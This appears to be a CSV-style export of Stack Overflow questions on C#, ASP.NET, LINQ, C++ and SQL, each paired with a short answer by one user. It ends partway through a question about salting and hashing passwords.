<p>Do I have to do this <em>every time</em> I want a specialized object?  Thanks in advance.</p>
","33708","Mehrdad Afshari","<pre><code>public ExtendedClient getExtendedClient(int clientID)
{
    var c = dc.GetTable&lt;tClient&gt;();
    var cs = dc.GetTable&lt;tClientSetting&gt;();
    var q = from client in c
            join setting in cs
            on client.ClientID equals setting.ClientID
            where client.ClientID == clientID
            select new ExtendedClient { ID = client.ClientID, Name = client.Name, strVal = setting.strValue };
    return q.Single();
}
</code></pre>

<p>You'll have to do a similar thing <em>every time you need to <strong>return</strong> a specialized object</em>. If you don't need to return it, you don't have to specify the type and you won't need a special class. You could use anonymous types:</p>

<pre><code>from client in c
join setting in cs
on client.ClientID equals setting.ClientID
where client.ClientID == clientID
select new { ID = client.ClientID, Name = client.Name, strVal = setting.strValue };
</code></pre>
"
"<p>I have a dataview where the interresting columns are length, height, color1, and color2 where color1 and color2 can be any of yellow, red, blue, black, white, or green. What is the best way to apply a filter where I get the rows with a certain length and height but with only the colors red, blue, and green? </p>

<p>The filter below feels a bit 'ugly' when the possible colors grow:</p>

<p><code>""length &gt; 10 AND height &gt; 10 AND (color1 = 'red' OR color1 = 'blue' OR color1 = 'green') AND (color2 = 'red' OR color2 = 'blue' OR color2 = 'green')""</code></p>

<p>Or is this the only/simplest way?</p>
","33708","Mehrdad Afshari","<p>Unfortunately, this is the nature of ""SQL style"" queries :)</p>

<p>The <code>IN</code> clause might make that query simpler:</p>

<pre><code>""length &gt; 10 AND height &gt; 10 AND color1 IN ('red', 'blue', 'green') AND color2 IN ('red', 'blue', 'green')""
</code></pre>
"
"<p>This may be a stupid question, but it's something that bugs me on a regular basis, so no harm in asking here I guess.</p>

<p>What exactly is Visual Studio doing when I open up an .ASPX file and it takes a good 4-5 seconds longer than if I was just opening the code behind file (.ASPX.CS).</p>

<p>I've noticed this happening with VS 2003, 2005 and 2008, and on a newly built machine too, so it's not an issue of my dev machine being too slow.</p>

<p>It seems to only happen when opening any .ASPX file for the first time in a particular session though. Is there some processing going on that I can disable to get rid of this delay?</p>

<p>Cheers</p>
","33708","Mehrdad Afshari","<p>Because Visual Studio has to process the <code>aspx</code> files to represent them in design view. Source files do not have a design view.</p>

<p>It probably caches what it needs for design view. This will make things faster the next time it wants to load the file.</p>
"
"<p>What are the do's and don'ts about Cache VS Session VS Cookies?</p>

<p>For example:
Im using Session variables a lot and have sometimes problem in a booking-application when users starts to order products and then goes to lunch and come back some hours later and continue the booking. I store the booking in the session until the user confirm or abort the booking so I dont need to talk to the database and handle halfway bookings in the database when users just click the X in the browser and never comes back.</p>

<p>Should I instead use cashe or cookies or any combination of all above for this?</p>

<p>(I have also had problems as when there are some error in the app the sessison-object resets itself and I got a lots of more problems because of that)</p>

<p>Im mostly doing desktop-programming and feel I lack a lots of knowledge here so anyone who can expand on where to use Cache, Session, cookies (or db) </p>

<p><strong>Edit:</strong> From the answers it seems that a combination of DB and cookies is what I want.   </p>

<ol>
<li>I have to store the booking in the database connected to a session-id  </li>
<li>store the session-id in a cookie (encrypted). </li>
<li>Every page load checking the cookie and fetch the booking from the database</li>
<li>I have a clean-up procedure that runs once a week that clears unfinnished bookings.</li>
</ol>

<p>I cant store the booking as a cookie because then the user can change prices and other sensitive data and I had to validate everything (cant trust the data).</p>

<p>Have I got it right?</p>

<p>And thanks for great explanations to all of you!</p>
","33708","Mehrdad Afshari","<p>State management is a critical thing to master when coming to Web world from a desktop application perspective.</p>

<ul>
<li><code>Session</code> is used to store <strong>per-user</strong> information for the current Web session on the <em>server</em>. It supports using a database server as the back-end store.</li>
<li><code>Cookie</code> should be used to store <strong>per-user</strong> information for the current Web session or <strong>persistent</strong> information on the <em>client</em>, therefore client has control over the contents of a cookie.</li>
<li><code>Cache</code> object is <strong>shared between users in a single application</strong>. Its primary purpose is to cache data from a data store and should not be used as a primary storage. It supports <em>automatic invalidation</em> features.</li>
<li><code>Application</code> object is shared between users to store <strong>application-wide</strong> state and should be used accordingly. </li>
</ul>

<p>If your application is used by a number of unauthenticated users, I suggest you store the data in a cookie. If it requires authentication, you can either store the data in the DB manually or use ASP.NET profile management features.</p>
"
"<p>I need to have a <code>static void* array[1024];</code> in a library and i need to have it set to NULL for every entries.</p>

<p>My question is about the best way to set the entire array to NULL, is a <code>memset (array, NULL, sizeof (void*) * 1024)</code> the best solution?</p>
","33708","Mehrdad Afshari","<p>Nope, it's wrong. You aren't considering the size of each element.</p>

<pre><code>memset(array, 0, sizeof(array)); // this works only on static arrays.
</code></pre>

<p>Generally you should use:</p>

<pre><code>memset(array_reference, 0, size_of_array * sizeof(array_element_type));
</code></pre>
"
"<p>I have command button added in my asp.net grids. After performing an action using that button, we refresh the grid to reflect the new data. (basically this action duplicates the grid row).</p>

<p>Now when user refresh the page using ""F5"", an alert message is displayed (to resend the information to server) if we select ""retry"", the action is repeated automatically.</p>

<p>I know this is a common problem in asp.net, how can we best handle this?</p>
","33708","Mehrdad Afshari","<p>If you think you don't need postback paradigm, you might want to look at ASP.NET MVC.</p>
"
"<p>Can I have nested try-catch blocks?
For example:</p>

<pre><code>
void f()
{
    try
    {
        //Some code 
        try
        {
             //Some code 
        }
        catch(ExceptionA a)
        {
            //Some specific exception handling
        }
        //Some code
    }
    catch(...)
    {
        //Some exception handling
    }
}//f
</code></pre>
","33708","Mehrdad Afshari","<p>Yes, you can.</p>
"
"<p>I am writing an app to discover what features exist on a pc. The user would go to a web page, download the app and execute it (with all the appropriate warnings, this is not spyware). The app would use the standard MS api to determine such things as connection speed, installed memory, firewall health, etc. Writing the app is not a problem, I could use Scripting Host, C#, C++, etc. The question is, if I chose C# is there any guarantee that a certain flavor of windows would have .net installed? The target pc is XP SP2 or better and Vista.</p>

<p>Thanks for the help.</p>
","33708","Mehrdad Afshari","<p>Vista does have .NET 3.0 installed. XP SP2 doesn't have any .NET framework installed by default.</p>
"
"<p>The application I'm working on has a single class that maintains a database connection. All members of this class are static to enforce a singleton-like pattern, so the actual connection logic is performed in a static initializer block:</p>

<pre><code>public class HibernateUtil {

    private static final SessionFactory sessionFactory;

    static {
        sessionFactory = new Configuration().configure().buildSessionFactory();
    }

    static void openSession() {
        //open session with sessionFactory
    }

    public static Session currentSession() {
        //return the currently open session
    }

    static void closeSession() {
        //close the currently open session
    }

}
</code></pre>

<p>However, the application now needs to open a database connection to a second database. The way this class in structured now, the only way to maintain the second connection while keeping the above pattern would be to create a second class (something like SecondHibernateUtil) and change the one line of configuration in the initializer block. That feels like a truly wasteful amount of copy/paste. </p>

<p>Can anyone suggest a way that I could rework this setup to maintain multiple connections simultaneously while not being overly destructive to the code already calling the existing methods?</p>
","33708","Mehrdad Afshari","<p>Maybe it shouldn't have been static in the first place.</p>
"
"<p>I'm setting up a wizard. All of my wizard views need access to common data for display like TotalWizardSteps and CurrentWizardStep. I'm trying to find the best way to go about adding this common data to the ViewDataDictionary. I'm thinking of creating my own WizardStepViewPage. This subclass would have a property 'WizardData' which returns a WizardData object. This would allow me to write the following code in my views:</p>

<pre><code>&lt;p&gt;Wizard Step:&lt;%= WizardData.CurrentStep %&gt;&lt;/p&gt;
</code></pre>

<p>The backing store for this WizardData object would be the ViewDataDictionary and some unlikley to reproduce key like ""__TheWizardData"". I'd set the value at this key with an actionfilter.</p>

<p>This sounds messy, but I think it will work. Is it dumb though? Is there a better way to achieve this?</p>

<p>I want:</p>

<ul>
<li>Strongly typed access to wizardData in html markup </li>
<li>To make my actions ignorant of the need to construct wizardData </li>
<li>To make my strongly typed viewData classes ignorant of wizardData</li>
</ul>
","33708","Mehrdad Afshari","<p>I think you should create a model class that holds the necessary info and use it to create a strongly typed view.</p>

<p>I don't see a good reason you might want to hide the WizardData from strongly typed models but if you <strong>really</strong> want to do so, why don't you create an extension method for <code>ViewPage</code> instead of inheriting? Inheritance wouldn't work well for different types of <code>ViewPage</code> (typed, untyped).</p>
"
"<p>With new features in .NET 3.5 (such as var, Lambda, linq, etc), and more on its way, we can conclude that C# not only statically typed language, but also <strong>Dynamically typed</strong> ?</p>

<p>Why or Why not?</p>

<p><strong>Edit#1</strong></p>

<p>As many posters below claim, .net 4.0 will add the dynamical type-ness to the language. Will this slow down the language?   </p>

<p>With every release csharp takes something from different languages. In so far as .Net1.1, our forefathers didn't intend to even make it functional language.... </p>

<p><strong>Edit#2</strong></p>

<p>I think many of you misunderstood the question; as I am referring to C# language overall, including the upcoming release 4.0. Thus, it is fair to say that the language is dynamically typed...</p>
","33708","Mehrdad Afshari","<p>Dynamically typed?! Nope. Technically, C# is a statically typed language. It has dynamic method dispatching capabilities through CLR reflection services provided by .NET runtime (which has been available since v1.0 and has nothing to do with .NET 3.5 features, C# 3.0 features are still statically typed). C# 4.0 will have true dynamic typing.</p>
"
"<p>I'm new to using Linq and just started a side project to learn some of the basics. I'm currently using Linq to Sql and all my DB Table relationships worked very well. Currently I have a Client table and a Project table. Each Client can have 1 or more Projects. Therefore, as you'd expect each Client object has a collection of Project objects after Linq does its magic. </p>

<p>I'm using the below code and it works well, but I think there is a better way of doing it. I need to pass my method a ProjectID and then select that Project from the Client:</p>

<pre><code>    private void PopulateStatusView(int projectID)
    {
        MyDataContext db = new MyDataContext();

        var client = (from u in db.Clients
                      where u.id == Convert.ToInt32(Session[""ClientID""])
                      select u).SingleOrDefault();

        if (client != null)
        {
            foreach (Project currentProject in client.Projects)
            {
                if (currentProject.id == projectID)
                {
                    // Project Selected Here
                    statusProjectName.Text = currentProject.name;
                }
            }
        }
        else
        {
             // Session Expired
        }
    }
</code></pre>

<p>Can anyone let me know if there's a better solution rather than looping over each Project.</p>

<p>Thank you.</p>
","33708","Mehrdad Afshari","<p>To get the client which has the specific project ID:</p>

<pre><code>var client = (from u in db.Clients
              where u.id == Convert.ToInt32(Session[""ClientID""]) &amp;&amp; 
                    u.Projects.Any(x=&gt;x.id == projectID)
              select u).SingleOrDefault();
</code></pre>

<p>To get the project:</p>

<pre><code>var project = (from u in db.Clients
              where u.id == Convert.ToInt32(Session[""ClientID""]) &amp;&amp; 
                    u.Projects.Any(x=&gt;x.id == projectID)
              select u.Projects.Where(x=&gt;x.id == projectID).Single()).SingleOrDefault();
</code></pre>
"
"<p>I currently have this type of code:</p>

<pre><code>private void FillObject(Object MainObject, Foo Arg1, Bar Arg2)
{
    if (MainObject is SomeClassType1)
    {
        SomeClassType1 HelpObject = (SomeClassType1)MainObject;
        HelpObject.Property1 = Arg1;
        HelpObject.Property2 = Arg2;
    }
    else if (MainObject is SomeClassType2)
    {
        SomeClassType2 HelpObject = (SomeClassType2)MainObject;
        HelpObject.Property1 = Arg1;
        HelpObject.Property2 = Arg2;
    }
}
</code></pre>

<p>Assuming that SomeClassType1 and SomeClassType2 have the same set of properties that I want to assign (although they may differ in other ones), is it possible to dynamically cast MainObject to the appropriate type and then assign the value, without duplicating the code? 
This is what I would like to see in the end:</p>

<pre><code>private void FillObject(Object MainObject, Foo Arg1, Bar Arg2)
{
    Type DynamicType = null;

    if (MainObject is SomeClassType1)
    {
        DynamicType = typeof(SomeClassType1);
    }
    else if (MainObject is SomeClassType2)
    {
        DynamicType = typeof(SomeClassType2);
    }

    DynamicType HelpObject = (DynamicType)MainObject;
    HelpObject.Property1 = Arg1;
    HelpObject.Property2 = Arg2;
}
</code></pre>

<p>And obviously C# complains about not being able to find DynamicType:</p>

<blockquote>
  <p>The type or namespace name 'DynamicType' could not be found (are you missing a using directive or an assembly reference?)</p>
</blockquote>

<p>Is something like this possible in C# 2.0? If it's more messy than my current code, than I see no point in doing this, but I'm very interested to find out. Thanks!</p>

<p>EDIT: Just to clarify, I perfectly understand that implementing an interface is the most appropriate and probably correct solution. That said, I'm more interested in seeing how to I could do it without implementing an interface. Thanks for great replies!</p>
","33708","Mehrdad Afshari","<pre><code>private void FillObject(Object MainObject, Foo Arg1, Bar Arg2)
{
    Type t = MainObject.GetType();

    t.GetProperty(""Property1"").SetValue(MainObject, Arg1, null);
    t.GetProperty(""Property2"").SetValue(MainObject, Arg2, null);
}
</code></pre>
"
"<p>One of the things I loved about VB6 is that you had the ability to tell the development environment to break on all errors regardless of what error handling you had set up.  Is it possible to do the same thing in VS2008 so that the debugger will stop on any error even if it happens inside a try-catch statement?</p>

<p>The problem is particularly hard when you are processing a file with say 500 records and it is failing on one of them - who knows which one - You don't want to modify the code so that your for counter is initialized outside that for loop - that is sloppy long-term.  You just want the debugger to know to stop because of some setting you put somewhere.</p>
","33708","Mehrdad Afshari","<p>Yes, go to ""Debug"" menu, select ""Exceptions..."", check ""Thrown"" for ""Common Language Runtime Exceptions""</p>
"
"<p>I am trying to traverse through a simple sitemap (adding and deleting elements on the fly.) This is the sample layout</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;urlset
      xmlns=""http://www.sitemaps.org/schemas/sitemap/0.9""
      xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
      xsi:schemaLocation=""http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd""&gt;
  &lt;url&gt;
    &lt;loc&gt;http://mysite.com/&lt;/loc&gt;
    &lt;priority&gt;1.00&lt;/priority&gt;
    &lt;changefreq&gt;daily&lt;/changefreq&gt;
  &lt;/url&gt;
  &lt;url&gt;
    &lt;loc&gt;http://mysite.com/Default.aspx&lt;/loc&gt;
    &lt;priority&gt;0.80&lt;/priority&gt;
    &lt;changefreq&gt;daily&lt;/changefreq&gt;
  &lt;/url&gt;
&lt;/urlset&gt;
</code></pre>

<p>Weirdly when I try to access a child element using the Element() method after loading the document, it's null, and so is Elements(), so I can't traverse through them. The Nodes() method has the elements though. </p>

<p>Here's the code I wrote</p>

<pre><code>XElement siteMap = XElement.Load(Server.MapPath(""~/sitemap.xml""));

//First remove all article nodes
foreach (XElement elem in siteMap.Elements())
{
    XElement loc = elem.Element(""loc"");
    if (loc.Value.Contains(""http://mysite.com/articles/""))
        elem.Remove();
}
</code></pre>

<p>No matter what I do to try and retrieve the elements of elem (Element, Elements), I get a null.</p>

<p>What could be wrong? This code is supposed to run. Isn't it?</p>
","33708","Mehrdad Afshari","<pre><code>var doc = XDocument.Load(Server.MapPath(""~/sitemap.xml""));
foreach (XElement elem in doc.Root.Elements()) {
     var loc = elem.Element(XName.Get(""loc"",""http://www.sitemaps.org/schemas/sitemap/0.9"") );
     if (loc.Value.Contains(""http://astrobix.com/articles/""))
         elem.Remove();
}
</code></pre>

<p>You could also do the following instead:</p>

<pre><code>doc.Root.Elements()
   .Where(x =&gt; x.Element(XName.Get(""loc"", ""http://www.sitemaps.org/schemas/sitemap/0.9""))
                .Value.Contains(""http://astrobix.com/articles/""))
   .Remove();
</code></pre>
"
"<p>If I have code like this:</p>

<pre><code>void a()
{
    try
    {
        b();
    }
    catch (MyException)
    {
        // Handle any problems that occurred in b(c(d()))
    }
}

void b()
{
    c();
    // Do something else
}

void c()
{
    d();
    // Do something else
}

void d()
{
    // Do something, throw a MyException if it fails
}
</code></pre>

<p>Assuming no cleanup is necessary at any point, is it best to put a try{}catch{throw;} around the call to d() in c() and the call to c() in b() or is it considered OK to let the exception from d() bubble up to a() ""naturally"" without any intervening try/catch blocks?</p>

<p>I suppose the extra try/catch block act as a sort of ""documentation"" but they seem superfluous so I'm just wondering what other people would consider the best way.</p>

<p>Sorry if this is all a bit too basic, I'm trying to get my head around exceptions but I don't seem to have a good feel for them yet.</p>
","33708","Mehrdad Afshari","<p>Basically, no. This is not the suggested way to handle these situations.</p>

<p>You should catch exceptions if and only if you can either handle them and do something appropriate with them or to provide more info to the callers higher in the call stack (by encapsulating it in a more generic exception). If you can't do it, you should let the exception bubble up in the call stack until someone can handle it appropriately.</p>
"
"<p>I have an object that is expensive to create, which uses some unmanaged resources that must be explicitly freed when done with and so implement IDisposable().  I would like a cache for instance of these expensive resources so that the creation cost is minimized, but I am having trouble knowing how to deal with the disposal.  </p>

<p>If the methods that use the objects are responsible for the disposal then I end up with disposed instances in the cache, which then have to be recreated, defeating the point of the cache.  If I don't dispose the objects in the methods that use them then they never get disposed.  I thought I could dispose them when they are taken out of the cache, but then I might end up disposing an instance which is still being used by a method.</p>

<p>Is it valid to just let them go out of scope and be collected by the garbage collector and free up the resources at that point? This feels wrong and against the idea of them being disposable...</p>
","33708","Mehrdad Afshari","<p>You could decouple the unmanaged resources from the managed instance and use a cache manager to hold a set of unmanaged resources. The managed object will try to acquire an instance of the unmanaged resource from the cache manager which will either create one or give one free instance from the cache and return it to the cache manager (instead of disposing it itself) at the time of its disposal. The cache manager will be the sole responsible object for allocating and freeing unmanaged resources when it sees it's necessary.</p>
"
"<p>Sorry, really newbie question, but if I was to create an ASP.NET website application, such as a calendar of events linked to a database - would the user interacting with this Calendar be using Active X?</p>

<p>Don't really know how to put that question any other way. Reason I ask is that my works system blocks Active X controls and therefore there would be no point in using ASP.NET to develop anything.</p>

<p>As a side question - What doesn't use Active X?</p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>ASP.NET is a server side technology and does not necessarily have anything to do with client side technologies such as ActiveX or anything else.</p>
"
"<p>In our asp.net 2.0 app we are using httpmodule and httphandler to calculate some metrics via cookies. To calculate network transfer time, httpmodule:EndRequest stores Transferstart in the cookie and httphandler:Processrequest uses datetime.now to subtract the transferstart to determine overall network time. Is this correct? I am also unclear about the request flow process. Does it go something like this:
request > HttpModule::OnStart > HttpModule::OnEnd > HttpHandler::ProcessRequest?</p>
","33708","Mehrdad Afshari","<p>The order is:</p>

<ul>
<li>Module OnStart</li>
<li>Handler ProcessRequest</li>
<li>Module OnEnd</li>
</ul>

<p>By the way, it's probably better to use <code>HttpContext.Items</code> property to share info between a handler and a module instead of a cookie.</p>
"
"<p>For the equivalent mechanism in C++ (the destructor), the advice is that <a href=""http://www.parashift.com/c++-faq-lite/exceptions.html#faq-17.3"">it should usually not throw any exceptions</a>. This is mainly because by doing so you might terminate your process, which is only very rarely a good strategy.</p>

<p>In the equivalent scenario in .NET ...</p>

<ol>
<li>A first exception is thrown</li>
<li>A finally block is executed as a result of the first exception</li>
<li>The finally block calls a Dispose() method</li>
<li>The Dispose() method throws a second exception</li>
</ol>

<p>... your process does not terminate immediately. However, you lose information because .NET unceremoneously replaces the first exception with the second one. A catch block somewhere up the call stack will therefore never see the first exception. However, one is usually more interested in the first exception because that normally gives better clues as to why things started to go wrong.</p>

<p>Since .NET lacks a mechanism to detect whether code is being executed while an exception is pending, it seems there are really only two choices how IDisposable can be implemented:</p>

<ul>
<li>Always swallow all exceptions that occur inside Dispose(). Not good as you might also end up swallowing OutOfMemoryException, ExecutionEngineException, etc. which I'd usually rather let tear down the process when they occur without another exception already pending.</li>
<li>Let all exceptions propagate out of Dispose(). Not good as you might lose information about the root cause of a problem, see above.</li>
</ul>

<p>So, which is the lesser of the two evils? Is there a better way?</p>

<p><strong>EDIT</strong>: To clarify, I'm not talking about actively throwing exceptions from Dispose() or not, I'm talking about letting exceptions thrown by methods called by Dispose() propagate out of Dispose() or not, for example:</p>

<pre><code>using System;
using System.Net.Sockets;

public sealed class NntpClient : IDisposable
{
    private TcpClient tcpClient;

    public NntpClient(string hostname, int port)
    {
        this.tcpClient = new TcpClient(hostname, port);
    }

    public void Dispose()
    {
        // Should we implement like this or leave away the try-catch?
        try
        {
            this.tcpClient.Close(); // Let's assume that this might throw
        }
        catch
        {
        }
    }
}
</code></pre>
","33708","Mehrdad Afshari","<p><code>Dispose</code> should be designed to do its purpose, disposing the object. This task <strong>is safe and does not throw exceptions most of the time</strong>. If you see yourself throwing exceptions from <code>Dispose</code>, you should probably think twice to see if you are doing too much stuff in it. Beside that, I think <code>Dispose</code> should be treated like all other methods: handle if you can do something with it, let it bubble if you can't.</p>

<p>EDIT: For the specified example, I would write the code so that <em>my code</em> does not cause an exception, but clearing the <code>TcpClient</code> up might cause an exception, which <em>should be valid to propagate</em> in my opinion (or to handle and rethrow as a more generic exception, just like any method):</p>

<pre><code>public void Dispose() { 
   if (tcpClient != null)
     tcpClient.Close();
}
</code></pre>

<p>However, just like any method, if you know <code>tcpClient.Close()</code> might throw an exception that should be ignored (doesn't matter) or should be represented by another exception object, you might want to catch it. </p>
"
"<p>This code behaves weird in MS Visual Studio:</p>

<pre><code>char *s = ""hello"";
s[0] = 'a';
printf(s);
</code></pre>

<p>In release build with optimization turned on it ignores s[0] = 'a' and prints ""hello"". Without optimization or in debug build it crashes with access violation.<br />
Is this behavior is c++ standard compliant or no? In my opinion, compiler should only allow constant references to string literals, i.e.</p>

<pre><code>const char *s = ""hello"";
</code></pre>

<p><strong>EDIT</strong>: I know why it works like this, I do not understand why I am allowed to make non const reference to read only memory.</p>
","33708","Mehrdad Afshari","<p>I think C++ compilers are allowed to allocate string literals in read only memory pages per the standard.</p>
"
"<p>It seems to me that a lot of my debugging time is spent chasing down null-reference exceptions in complex statements. For instance:</p>

<pre><code>For Each game As IHomeGame in _GamesToOpen.GetIterator()
</code></pre>

<p>Why, when I get a NullReferenceException, can I get the line number in the stack trace, but not the name of the object that equals null. In other words, why:</p>

<pre><code>Object reference not set to an instance of an object.
</code></pre>

<p>instead of</p>

<pre><code>_GamesToOpen is not set to an instance of an object.
</code></pre>

<p>or</p>

<pre><code>Anonymous object returned by _GamesToOpen.GetIterator() is null.
</code></pre>

<p>or</p>

<pre><code>game was set to null.
</code></pre>

<p>Is this strictly a design choice, meant to protect the anonymity of the code or is there a compelling reason in compiler design not to include this information in the debug-time exception?</p>
","33708","Mehrdad Afshari","<p>Exceptions are runtime things, variables are compile time things.</p>

<p>In fact, the variable in your example is <em>an expression</em>. Expressions are not always simple variables. At runtime, the expression will be evaluated and the method will be called on the resulting object. If the value of that expression is <code>null</code>, the runtime will throw a <code>NullReferenceException</code>. Assume the following:</p>

<pre><code>Dim a as New MyObject
Dim b as String = MyObject.GetNullValue().ToString()
</code></pre>

<p>What error message should the runtime return if the <code>GetNullValue()</code> method returns <code>null</code>?</p>
"
"<p>What is the difference between saying:</p>

<pre><code>if (abc == ""a"")
{
// do something here...
return;
}
</code></pre>

<p>and the same as above, but without the return keyword?</p>

<p>I am a C# coder and I know that the return keyword followed by a type or variable returns that item, but in the above context, return seems to be just to exit the code block but does it make any functional or performance change on the code?</p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p><code>return</code> statement exits the function immediately, so it might have performance benefits as the following code in the function would not be executed at all.</p>
"
"<p>I am creating a card game in C# for a school project. This card game is networked. The card game's game data is stored in a singleton object as gameData. gameData holds, the player names, which player the game is waiting on, player objects. Each player has 3 List objects. Where the cards are again custom objects. Originally I was going to create a ToByte() method for each card, player, and gameData object and serialize them to send over the network using TCPlistener. However running low on time I am looking for other ways.</p>

<p>These are the solutions I have heard of:</p>

<p>-SOAP (Have no clue how to implement this)</p>

<p>-Database (seems overkill for LAN, unless if a small database server can be made to run on the fly)</p>

<p>-Client Activated Object (but this create different singleton for each client)</p>

<p>What I would like to do is make that each client use their own gameData but using the get, set it would talk to a server that host this singleton object data. What do you recommend?</p>
","33708","Mehrdad Afshari","<p>Since this is a school project, I think using .NET remoting is the fastest way to go :)</p>

<p>To make things simple and reduce nasty debugging and object management stuff, I would suggest handling everything on the server using a singleton object and return marshal by value objects to clients as data (again, since it's a school project). Give each client an ID to pass to the server object. </p>
"
"<p>I have an ASP.NET application using Forms Authentication. When the user clicks the Sign Out button on the page it runs the following code.</p>

<pre><code>        FormsAuthentication.SignOut();
        Response.Expires = 0;
        Response.Cache.SetNoStore();
        Response.AppendHeader(""Pragma"", ""no-cache"");
</code></pre>

<p>However the user can still just press the back arrow and see the previous page without needing to log in again. I am sure it has something to do with the previous page being cached. How can I make sure they are prompted to log in again with going back?</p>
","33708","Mehrdad Afshari","<pre><code>Response.Cache.SetCacheability(HttpCacheability.NoCache);
</code></pre>
"
"<p>I see it in the solution I am looking for, but if I try to use it I get:</p>

<p><strong>CS0103: The name 'Sys' does not exist in the current context</strong></p>

<p>I have VS 2008 SP1 installed, I am probably missing something that is pretty obvious?</p>
","33708","Mehrdad Afshari","<p><code>Sys</code> namespace is in JavaScript. It's a client side namespace provided by ASP.NET AJAX. You can't use it from server side code.</p>
"
"<p>I'm trying to gain some memory saving in a C++ program and I want to know if I can use blocks as a scope for variables (as in Perl). Let's say I have a <strong>huge</strong> object that performs some computations and gives a result, does it makes sense to do:</p>

<pre><code>InputType  input;
ResultType result;

{
    // Block of code
    MyHugeObject mho;
    result = mho.superHeavyProcessing();
}

/*
   My other code ...
*/
</code></pre>

<p>Can I expect the object to be destroyed when exiting the block?</p>
","33708","Mehrdad Afshari","<p>Yes, you can.</p>

<p>The destructor will be called as soon as the variable <strong>falls out of scope</strong> and it should release the heap-allocated memory.</p>
"
"<p>I have 2 tables:</p>

<p>'Users' Table</p>

<pre>
id      username  
----    -------- 
0001    user1          
0002    user2          
0003    user3          
0004    user4     
</pre>

<p>'Friends' Table</p>

<pre>
user_id  friend_id  friend
-------  ---------  ------
0001     0004       1
0002     0004       1
0005     0004       0
</pre>

<p>How do I display all user4 friends' name? if in friends table, friend column, 1 indicates they are friend, 0 indicate they are still not friend.</p>

<p>I use INNER JOIN, which looks like this:</p>

<pre><code>SELECT users.username
FROM `users`
INNER JOIN `friends` ON users.id = friends.friend_id
WHERE friends.user_id = 0004
  AND friend = 1;
</code></pre>

<p>But what I get is:</p>

<p>user4 and user4 instead of user1 and user2</p>

<p>Can help me?</p>
","33708","Mehrdad Afshari","<pre><code>SELECT u.username
FROM Friends f, Users u
WHERE f.friend = 1 AND 
 ((f.friend_id = @userid AND f.user_id = u.id) OR
  (f.user_id = @userid AND f.friend_id = u.id))
</code></pre>
"
"<p>I have the following requirement. On my html page, While clicking the link of an Image (""img"") or anchor(""a"") tags , I would like to add my custom headers for the GET request. These links are typically  for downloading dynamic content. These headers could be SAML headers or custom application specific headers. Is it possible to add these custom headers through JavaScript? Or if I add these through xmlhttprequest, how can i achieve the download functionality?</p>

<p>This requirement is for IE6 or 7 only. </p>

<p>Regards,
Srinivas</p>
","33708","Mehrdad Afshari","<p>I think the easiest way to accomplish it is to use querystring instead of HTTP headers.</p>
"
"<p>To able to do proper cross-thread access I'm using a piece of code something like this :</p>

<pre><code>Private Delegate Sub DelSetButton(ByVal button As Button, ByVal label As String, ByVal enabled As Boolean)

Private Sub SetButton(ByVal button As Button, ByVal label As String, ByVal enabled As Boolean)
    If InvokeRequired Then
        Invoke(New DelSetButton(AddressOf SetButton), button, label, enabled)

    Else
        button.Enabled = enabled
        button.Text = label

    End If
End Sub
</code></pre>

<p>Which is not lovely. </p>

<ul>
<li>I have to create a delegate with the same signature</li>
<li>I need to write a similar call for each control type or each action I want</li>
</ul>

<p>I'm using VB.NET 9 / .NET Framework 3.5. </p>

<p>Is there any better way to do it? Or am I stuck with this model?</p>

<p><strong>UPDATE :</strong></p>

<p>After the answers I like this one best : </p>

<pre><code>Private Sub ContSetButton(ByVal button As Button, ByVal label As String, ByVal enabled As Boolean)
    Invoke(New Action(Of Button, String, Boolean)(AddressOf SetButton), button, label, enabled)
End Sub

Private Sub SetButton(ByVal button As Button, ByVal label As String, ByVal Enabled As Boolean)
    button.Text = label
    button.Enabled = Enabled
End Sub
</code></pre>

<p>Still not perfect but better than what I've done originally. </p>

<p>Feel free to answer if you can make it better than this.</p>
","33708","Mehrdad Afshari","<p>You could use a <code>BackgroundWorker</code> and use the <code>ReportProgress</code> method to communicate with the UI thread. In the UI thread, you handle the <code>ProgressChanged</code> event and update the UI appropriately.</p>
"
"<p>The question's pretty self-explanatory really. I know vaguely about vectors in maths, but I don't really see the link to C++ vectors. </p>
","33708","Mehrdad Afshari","<p>Mathematical definition of a vector is a member of the set <code>S</code><sup><code>n</code></sup>, which is an ordered sequence of values in a specific set (<code>S</code>). This is what a C++ <code>vector</code> stores.</p>
"
"<p>I've got a procedure to return a result set which is limited by page number and some other stuff. As an OUTPUT parameter I need to return a total amount of selected rows according to the parameters except the page number. So I have something like that:</p>

<pre><code>WITH SelectedItems AS
(SELECT Id, Row1, Row2, ROW_NUMBER() OVER (ORDER BY Row1) AS Position
FROM Items
WHERE Row2 = @Row2)
SELECT Id, Row1, Row2
FROM SelectedItems
WHERE Position BETWEEN @From AND @To
</code></pre>

<p>And then I need to set the OUTPUT parameter to the number of rows in the innerquery. I can just copy the query and count it, but this query could returns thousands of rows (and will be more in the future), so I am looking for method to do that with a good performance. I was thinking about table variables, is it a good idea? Or any other suggestions?</p>

<p>To be more specific, it's the Microsoft SQL Server 2008.</p>

<p>Thank you, Jan</p>
","33708","Mehrdad Afshari","<p>I think you should do it in a separate query. While those two queries might look pretty much the same, but the way query optimizer deals with them would differ pretty significantly.</p>

<p>Theoretically, SQL Server might not even go through all the rows in the subquery to be able to count it.</p>
"
"<p>Hi 
i'm doing a test how hash and salt passwords.
Well , i can add hash and salt password to the Database but i got stuck to store passwords from database.
i have a simple Database :</p>

<pre><code>                                Table
                               _______

                               ProvaHS
                               --------
                          (PK) LoginID   int 
                               UserName  nvarchar(50)
                               Password  nvarchar(50)
                               Salt      nvarchar(50)
</code></pre>

<p>So i create a form to add new record to the database with this code:</p>

<pre><code> public partial class Window1 : Window
{
    public Window1()
    {
        InitializeComponent();
    }

    #region SALT
    public static class PasswordCrypto
    {
        private static SHA1CryptoServiceProvider Hasher = new SHA1CryptoServiceProvider();
        //Private Hasher As New MD5CryptoServiceProvider()

        static internal string GetSalt(int saltSize)
        {
            byte[] buffer = new byte[saltSize + 1];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            rng.GetBytes(buffer);
            return Convert.ToBase64String(buffer);
        }

        static internal string HashEncryptString(string s)
        {
            byte[] clearBytes = Encoding.UTF8.GetBytes(s);
